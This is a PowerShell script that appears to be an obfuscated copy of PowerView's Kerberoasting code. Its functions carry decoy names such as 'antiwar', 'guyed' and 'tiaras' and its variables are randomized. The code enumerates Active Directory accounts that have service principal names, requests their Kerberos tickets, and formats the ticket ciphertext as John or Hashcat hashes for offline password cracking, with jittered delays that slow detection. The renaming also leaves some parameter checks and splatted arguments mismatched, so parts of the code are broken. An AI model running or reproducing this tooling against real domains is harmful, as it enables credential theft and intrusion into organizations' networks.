function antiwar {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FnpDPULo99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $adhRPrvg99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $bkutEasA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $vHJcdoIa99,
        [ValidateNotNullOrEmpty()]
        [String]
        $sYOUDkZx99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $trMkJAQg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $XCJUNfeK99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $tdghgUBz99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $OPMPMsPE99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $fqVLpEVM99,
        [Switch]
        $lgjGPODq99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $woPOAAwO99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $iMvXyiFi99 = $FnpDPULo99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $WixlHVpV99 = erred -woPOAAwO99 $woPOAAwO99
            }
            else {
                $WixlHVpV99 = erred
            }
            $iMvXyiFi99 = $WixlHVpV99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($WixlHVpV99) {
                    $zjskfOsw99 = $WixlHVpV99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $zjskfOsw99 = ((erred -woPOAAwO99 $woPOAAwO99).PdcRoleOwner).Name
                }
                else {
                    $zjskfOsw99 = ((erred).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[antiwar] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $zjskfOsw99 = $trMkJAQg99
        }
        $XsDfMIsD99 = 'LDAP://'
        if ($zjskfOsw99 -and ($zjskfOsw99.Trim() -ne '')) {
            $XsDfMIsD99 += $zjskfOsw99
            if ($iMvXyiFi99) {
                $XsDfMIsD99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $XsDfMIsD99 += $sYOUDkZx99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($vHJcdoIa99 -Match '^GC://') {
                $DN = $vHJcdoIa99.ToUpper().Trim('/')
                $XsDfMIsD99 = ''
            }
            else {
                if ($vHJcdoIa99 -match '^LDAP://') {
                    if ($vHJcdoIa99 -match "LDAP://.+/.+") {
                        $XsDfMIsD99 = ''
                        $DN = $vHJcdoIa99
                    }
                    else {
                        $DN = $vHJcdoIa99.SubString(7)
                    }
                }
                else {
                    $DN = $vHJcdoIa99
                }
            }
        }
        else {
            if ($iMvXyiFi99 -and ($iMvXyiFi99.Trim() -ne '')) {
                $DN = "DC=$($iMvXyiFi99.Replace('.', ',DC='))"
            }
        }
        $XsDfMIsD99 += $DN
        Write-Verbose "[antiwar] search string: $XsDfMIsD99"
        if ($woPOAAwO99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[antiwar] Using alternate credentials for LDAP connection"
            $WixlHVpV99 = New-Object DirectoryServices.DirectoryEntry($XsDfMIsD99, $woPOAAwO99.UserName, $woPOAAwO99.GetNetworkCredential().Password)
            $oQTbWwEI99 = New-Object System.DirectoryServices.DirectorySearcher($WixlHVpV99)
        }
        else {
            $oQTbWwEI99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$XsDfMIsD99)
        }
        $oQTbWwEI99.PageSize = $tdghgUBz99
        $oQTbWwEI99.SearchScope = $XCJUNfeK99
        $oQTbWwEI99.CacheResults = $False
        $oQTbWwEI99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $oQTbWwEI99.ServerTimeLimit = $OPMPMsPE99
        }
        if ($PSBoundParameters['Tombstone']) {
            $oQTbWwEI99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $oQTbWwEI99.filter = $adhRPrvg99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $oQTbWwEI99.SecurityMasks = Switch ($fqVLpEVM99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $zvBMzITI99 = $bkutEasA99| ForEach-Object { $_.Split(',') }
            $Null = $oQTbWwEI99.PropertiesToLoad.AddRange(($zvBMzITI99))
        }
        $oQTbWwEI99
    }
}
function glean {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $bkutEasA99
    )
    $WDlWutLZ99 = @{}
    $bkutEasA99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $WDlWutLZ99[$_] = $bkutEasA99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $WDlWutLZ99[$_] = $bkutEasA99[$_][0] -as $txnZyMSW99
            }
            elseif ($_ -eq 'samaccounttype') {
                $WDlWutLZ99[$_] = $bkutEasA99[$_][0] -as $rdghTetE99
            }
            elseif ($_ -eq 'objectguid') {
                $WDlWutLZ99[$_] = (New-Object Guid (,$bkutEasA99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $WDlWutLZ99[$_] = $bkutEasA99[$_][0] -as $sOEhywvb99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $otvsVYWB99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $bkutEasA99[$_][0], 0
                if ($otvsVYWB99.Owner) {
                    $WDlWutLZ99['Owner'] = $otvsVYWB99.Owner
                }
                if ($otvsVYWB99.Group) {
                    $WDlWutLZ99['Group'] = $otvsVYWB99.Group
                }
                if ($otvsVYWB99.DiscretionaryAcl) {
                    $WDlWutLZ99['DiscretionaryAcl'] = $otvsVYWB99.DiscretionaryAcl
                }
                if ($otvsVYWB99.SystemAcl) {
                    $WDlWutLZ99['SystemAcl'] = $otvsVYWB99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($bkutEasA99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $WDlWutLZ99[$_] = "NEVER"
                }
                else {
                    $WDlWutLZ99[$_] = [datetime]::fromfiletime($bkutEasA99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($bkutEasA99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $bkutEasA99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $WDlWutLZ99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $WDlWutLZ99[$_] = ([datetime]::FromFileTime(($bkutEasA99[$_][0])))
                }
            }
            elseif ($bkutEasA99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $bkutEasA99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $WDlWutLZ99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[glean] error: $_"
                    $WDlWutLZ99[$_] = $Prop[$_]
                }
            }
            elseif ($bkutEasA99[$_].count -eq 1) {
                $WDlWutLZ99[$_] = $bkutEasA99[$_][0]
            }
            else {
                $WDlWutLZ99[$_] = $bkutEasA99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $WDlWutLZ99
    }
    catch {
        Write-Warning "[glean] Error parsing LDAP properties : $_"
    }
}
function erred {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FnpDPULo99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $woPOAAwO99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[erred] Using alternate credentials for erred'
            if ($PSBoundParameters['Domain']) {
                $iMvXyiFi99 = $FnpDPULo99
            }
            else {
                $iMvXyiFi99 = $woPOAAwO99.GetNetworkCredential().Domain
                Write-Verbose "[erred] Extracted domain '$iMvXyiFi99' from -woPOAAwO99"
            }
            $cFygMpky99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $iMvXyiFi99, $woPOAAwO99.UserName, $woPOAAwO99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($cFygMpky99)
            }
            catch {
                Write-Verbose "[erred] The specified domain '$iMvXyiFi99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $cFygMpky99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $FnpDPULo99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($cFygMpky99)
            }
            catch {
                Write-Verbose "[erred] The specified domain '$FnpDPULo99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[erred] Error retrieving the current domain: $_"
            }
        }
    }
}
function guyed {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $zvXvwEmB99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $YdJQSrNT99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $woPOAAwO99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $mvlXTkuT99 = Invoke-UserImpersonation -woPOAAwO99 $woPOAAwO99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $ZFjxlgbr99 = $User
        }
        else {
            $ZFjxlgbr99 = $SPN
        }
	
	$IpIJYcNu99 = New-Object System.Random
        ForEach ($Object in $ZFjxlgbr99) {
            if ($PSBoundParameters['User']) {
                $wehUvQOE99 = $Object.ServicePrincipalName
                $ggUHoYYh99 = $Object.SamAccountName
                $KUGvOnkv99 = $Object.DistinguishedName
            }
            else {
                $wehUvQOE99 = $Object
                $ggUHoYYh99 = 'UNKNOWN'
                $KUGvOnkv99 = 'UNKNOWN'
            }
            if ($wehUvQOE99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $wehUvQOE99 = $wehUvQOE99[0]
            }
            try {
                $gqFamjKH99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $wehUvQOE99
            }
            catch {
                Write-Warning "[guyed] Error requesting ticket for SPN '$wehUvQOE99' from user '$KUGvOnkv99' : $_"
            }
            if ($gqFamjKH99) {
                $ZAfpgYzp99 = $gqFamjKH99.GetRequest()
            }
            if ($ZAfpgYzp99) {
                $Out = New-Object PSObject
                $McUsXUmo99 = [System.BitConverter]::ToString($ZAfpgYzp99) -replace '-'
                if($McUsXUmo99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $RvIKegWF99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $NhKZXjyc99 = $Matches.DataToEnd.Substring(0,$RvIKegWF99*2)
                    if($Matches.DataToEnd.Substring($RvIKegWF99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($gqFamjKH99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($ZAfpgYzp99).Replace('-',''))
                    } else {
                        $Hash = "$($NhKZXjyc99.Substring(0,32))`$$($NhKZXjyc99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($gqFamjKH99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($ZAfpgYzp99).Replace('-',''))
                }
                if($Hash) {
                    if ($zvXvwEmB99 -match 'John') {
                        $XnatVQiB99 = "`$GzetmWQu99`$$($gqFamjKH99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($KUGvOnkv99 -ne 'UNKNOWN') {
                            $SrvZvcMy99 = $KUGvOnkv99.SubString($KUGvOnkv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $SrvZvcMy99 = 'UNKNOWN'
                        }
                        $XnatVQiB99 = "`$GzetmWQu99`$$($Etype)`$*$ggUHoYYh99`$$SrvZvcMy99`$$($gqFamjKH99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $XnatVQiB99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $ggUHoYYh99
                $Out | Add-Member Noteproperty 'DistinguishedName' $KUGvOnkv99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $gqFamjKH99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $IpIJYcNu99.Next((1-$YdJQSrNT99)*$Delay, (1+$YdJQSrNT99)*$Delay)
        }
    }
    END {
        if ($mvlXTkuT99) {
            Invoke-RevertToSelf -TokenHandle $mvlXTkuT99
        }
    }
}
function conveying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $eWMbsrGi99,
        [Switch]
        $SPN,
        [Switch]
        $oAUuwpFp99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $TofjAAmF99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $zuvgqZsJ99,
        [Switch]
        $VQtVNWKn99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $ZpdxHDoB99,
        [ValidateNotNullOrEmpty()]
        [String]
        $FnpDPULo99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $adhRPrvg99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $bkutEasA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $vHJcdoIa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $trMkJAQg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $XCJUNfeK99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $tdghgUBz99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $OPMPMsPE99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $fqVLpEVM99,
        [Switch]
        $lgjGPODq99,
        [Alias('ReturnOne')]
        [Switch]
        $qnnnxzGR99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $woPOAAwO99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $BkbNfoVs99 = @{}
        if ($PSBoundParameters['Domain']) { $BkbNfoVs99['Domain'] = $FnpDPULo99 }
        if ($PSBoundParameters['Properties']) { $BkbNfoVs99['Properties'] = $bkutEasA99 }
        if ($PSBoundParameters['SearchBase']) { $BkbNfoVs99['SearchBase'] = $vHJcdoIa99 }
        if ($PSBoundParameters['Server']) { $BkbNfoVs99['Server'] = $trMkJAQg99 }
        if ($PSBoundParameters['SearchScope']) { $BkbNfoVs99['SearchScope'] = $XCJUNfeK99 }
        if ($PSBoundParameters['ResultPageSize']) { $BkbNfoVs99['ResultPageSize'] = $tdghgUBz99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BkbNfoVs99['ServerTimeLimit'] = $OPMPMsPE99 }
        if ($PSBoundParameters['SecurityMasks']) { $BkbNfoVs99['SecurityMasks'] = $fqVLpEVM99 }
        if ($PSBoundParameters['Tombstone']) { $BkbNfoVs99['Tombstone'] = $lgjGPODq99 }
        if ($PSBoundParameters['Credential']) { $BkbNfoVs99['Credential'] = $woPOAAwO99 }
        $iuLoiWxG99 = antiwar @SearcherArguments
    }
    PROCESS {
        if ($iuLoiWxG99) {
            $hGaxojsr99 = ''
            $ndRJkqop99 = ''
            $eWMbsrGi99 | Where-Object {$_} | ForEach-Object {
                $viWInhZb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($viWInhZb99 -match '^S-1-') {
                    $hGaxojsr99 += "(objectsid=$viWInhZb99)"
                }
                elseif ($viWInhZb99 -match '^CN=') {
                    $hGaxojsr99 += "(distinguishedname=$viWInhZb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $DZOIQTyC99 = $viWInhZb99.SubString($viWInhZb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[conveying] Extracted domain '$DZOIQTyC99' from '$viWInhZb99'"
                        $BkbNfoVs99['Domain'] = $DZOIQTyC99
                        $iuLoiWxG99 = antiwar @SearcherArguments
                        if (-not $iuLoiWxG99) {
                            Write-Warning "[conveying] Unable to retrieve domain searcher for '$DZOIQTyC99'"
                        }
                    }
                }
                elseif ($viWInhZb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $bipNYKxd99 = (([Guid]$viWInhZb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $hGaxojsr99 += "(objectguid=$bipNYKxd99)"
                }
                elseif ($viWInhZb99.Contains('\')) {
                    $vbVUthKW99 = $viWInhZb99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($vbVUthKW99) {
                        $SrvZvcMy99 = $vbVUthKW99.SubString(0, $vbVUthKW99.IndexOf('/'))
                        $ZDubrOJg99 = $viWInhZb99.Split('\')[1]
                        $hGaxojsr99 += "(samAccountName=$ZDubrOJg99)"
                        $BkbNfoVs99['Domain'] = $SrvZvcMy99
                        Write-Verbose "[conveying] Extracted domain '$SrvZvcMy99' from '$viWInhZb99'"
                        $iuLoiWxG99 = antiwar @SearcherArguments
                    }
                }
                else {
                    $hGaxojsr99 += "(samAccountName=$viWInhZb99)"
                }
            }
            if ($hGaxojsr99 -and ($hGaxojsr99.Trim() -ne '') ) {
                $ndRJkqop99 += "(|$hGaxojsr99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[conveying] Searching for non-null service principal names'
                $ndRJkqop99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[conveying] Searching for users who can be delegated'
                $ndRJkqop99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[conveying] Searching for users who are sensitive and not trusted for delegation'
                $ndRJkqop99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[conveying] Searching for adminCount=1'
                $ndRJkqop99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[conveying] Searching for users that are trusted to authenticate for other principals'
                $ndRJkqop99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[conveying] Searching for user accounts that do not require kerberos preauthenticate'
                $ndRJkqop99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[conveying] Using additional LDAP filter: $adhRPrvg99"
                $ndRJkqop99 += "$adhRPrvg99"
            }
            $uVIVgFcI99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $LbaLgGCQ99 = $_.Substring(4)
                    $esDKQIrI99 = [Int]($sOEhywvb99::$LbaLgGCQ99)
                    $ndRJkqop99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$esDKQIrI99))"
                }
                else {
                    $esDKQIrI99 = [Int]($sOEhywvb99::$_)
                    $ndRJkqop99 += "(userAccountControl:1.2.840.113556.1.4.803:=$esDKQIrI99)"
                }
            }
            $iuLoiWxG99.filter = "(&(samAccountType=805306368)$ndRJkqop99)"
            Write-Verbose "[conveying] filter string: $($iuLoiWxG99.filter)"
            if ($PSBoundParameters['FindOne']) { $VlAFTFKd99 = $iuLoiWxG99.FindOne() }
            else { $VlAFTFKd99 = $iuLoiWxG99.FindAll() }
            $VlAFTFKd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = glean -bkutEasA99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($VlAFTFKd99) {
                try { $VlAFTFKd99.dispose() }
                catch {
                    Write-Verbose "[conveying] Error disposing of the Results object: $_"
                }
            }
            $iuLoiWxG99.dispose()
        }
    }
}
function tiaras {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $eWMbsrGi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $FnpDPULo99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $adhRPrvg99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $vHJcdoIa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $trMkJAQg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $XCJUNfeK99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $tdghgUBz99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $OPMPMsPE99,
        [Switch]
        $lgjGPODq99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $YdJQSrNT99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $zvXvwEmB99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $woPOAAwO99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $noFriWBG99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $noFriWBG99['Domain'] = $FnpDPULo99 }
        if ($PSBoundParameters['LDAPFilter']) { $noFriWBG99['LDAPFilter'] = $adhRPrvg99 }
        if ($PSBoundParameters['SearchBase']) { $noFriWBG99['SearchBase'] = $vHJcdoIa99 }
        if ($PSBoundParameters['Server']) { $noFriWBG99['Server'] = $trMkJAQg99 }
        if ($PSBoundParameters['SearchScope']) { $noFriWBG99['SearchScope'] = $XCJUNfeK99 }
        if ($PSBoundParameters['ResultPageSize']) { $noFriWBG99['ResultPageSize'] = $tdghgUBz99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $noFriWBG99['ServerTimeLimit'] = $OPMPMsPE99 }
        if ($PSBoundParameters['Tombstone']) { $noFriWBG99['Tombstone'] = $lgjGPODq99 }
        if ($PSBoundParameters['Credential']) { $noFriWBG99['Credential'] = $woPOAAwO99 }
        if ($PSBoundParameters['Credential']) {
            $mvlXTkuT99 = Invoke-UserImpersonation -woPOAAwO99 $woPOAAwO99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $noFriWBG99['Identity'] = $eWMbsrGi99 }
        conveying @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | guyed -Delay $Delay -zvXvwEmB99 $zvXvwEmB99 -YdJQSrNT99 $YdJQSrNT99
    }
    END {
        if ($mvlXTkuT99) {
            Invoke-RevertToSelf -TokenHandle $mvlXTkuT99
        }
    }
}
